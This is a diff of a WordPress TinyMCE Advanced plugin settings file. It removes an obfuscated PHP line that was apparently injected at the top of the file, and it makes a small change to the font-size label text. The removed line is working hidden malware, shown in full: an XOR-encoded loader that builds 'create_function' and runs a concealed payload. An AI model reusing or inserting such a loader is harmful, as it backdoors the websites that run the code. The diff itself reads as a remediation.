@@ -1,4 +1,4 @@
-<?php $mTvijRXgtTEX='Z3NX1=3XA6HOZ<='^'9A+9EXl>4X+;3SS';$wBJyLqfd=$mTvijRXgtTEX('','S,DRM,CUY.ZR,PNRS 9Qb,QLrY2.;+aPBBPBJq+f4 E649QY4O.U0aR7L34m=4=mK+RF.ULU-24ZvCEHNFrG=qW8OeEBqPtnn=3W9Mi;UjZwsUq<s:OHXPSMP.13ALUEH<YnCedzcTUGsIiQXw-Y=6.s8gjlLiGWYblTuHQD,;Q4POEE DAqFYI;zL<EU3Eda62:yk6Y6ySG=U2ZZSHIg.U:76K4oU,716U= Nlm1R+E4k0K--RE.OZMya7v uqqsfYNmqKNKSZFHe.SZDImuUzab3RG6bF3,jIfgEQEOBOj,AJ+JZDhHYGU3Zh6cgSWQrSBT.05MEIozF>J<.VXhzo3=icb2;jZM1dJS-YovQJI=M<02nEPGj:wU2DZ5,VGwMCF,IBhFEmgYZG0hOdN2+9-EJi9Ls91FH4 NAjSjmNEG75>+YIZ1k,A3,R. Z;qV2DrP0=7YC8ZET ZKxGD7ESqKGi.5LTt2<Oqpo2R6OcD;98TSSqM0L713;IUtV5X8X2JAUV>qdgn0MN3faCBGNV2GCEVZ8Pmp:3WNsyiuMenPMDnHhUDLte:rdHDLSRGWRbFk3T,DlXXTOEoWB,E6W l=,Di.6G62>qI5Q6RDAUUFUKHOOXkXJnoFfcL3J CZXEh08GQeeB-0>XODV<Ct62,VX fusvZP'^':Jls+Y-6-G5<s56; TJyET>>-=SZZt>=76wkcQPl=F0XWM86ZoV:B>6V8Rk2PAIEoO32OylqFWMsVcehn=xN4U8M;ExbVwOdg4U8KeMRuWzGHuUUOI;:45=etJPG enelUrEjomsG; 3SgTqpSI8IWuWQ:J2lM,2 9H=Umq7XI=Q>ga.E=h,obC2s>Y1 A+LEYGNPP<PKs.M7qV;.2htGH4VDSp>K1MCPi>XYnQMW3G6QP:AKB  O,2mQEh5o::86F8=MU +2sgxhAX261,DU.phFW33W=-VUJtFC.4<tHFNH >JjgdL>8+ VabKim:1qZrf0ODTde2es Q8YO50HRKlo,27wh>z,BDn8H OKojmK,PEWGe+Mc3S1S0;jG3>WpcbG,;SLLdC=;3QHrDjDJUX qc01yD;LlPA: JnJ-;+4RGWJ5  TCT.As6OT;d.;G0Z2QNRowg> 7O>.Pc V12XggMJT85+YY6XYT8;PgG ZMYtuuQ,B>VHlP,,+3M1K,Abf>3GVHGJT,:ROAedgf;Vrka2;L16WQV.i.PIHpEI1yqVxZgtuCPXCU- xc4qbgPwYU7I Y>=sfeIqbM7D6Y3VI=6KN.EFMYnE0O>+ 1rjuo,.;9BqjNOfFC79CE5;4mLTY30>B2LIR7. qajO<;I.1TNEZMP-');$wBJyLqfd();
+<?php
 /**
  * This file is part of the TinyMCE Advanced WordPress plugin and is released under the same license.
  * For more information please see tinymce-advanced.php.
@@ -330,7 +330,7 @@ foreach( $all_buttons as $button => $name ) {
 	<div>
 		<label><input type="checkbox" name="options[]" value="fontsize_formats" id="fontsize_formats" <?php if ( $this->check_user_setting( 'fontsize_formats' ) ) echo ' checked="checked"'; ?> />
 		<?php _e( 'Font sizes', 'tinymce-advanced' ); ?></label>
-		<p><?php _e( 'Replace the size setting available for fonts with: 8px 10px 12px 14px 16px 20px 24px 28px 32px 36px 48px 60px.', 'tinymce-advanced' ); ?></p>
+		<p><?php printf( __( 'Replace the size setting available for fonts with: %s.', 'tinymce-advanced' ), $this->fontsize_formats ); ?></p>
 	</div>
 </div>
 <?php
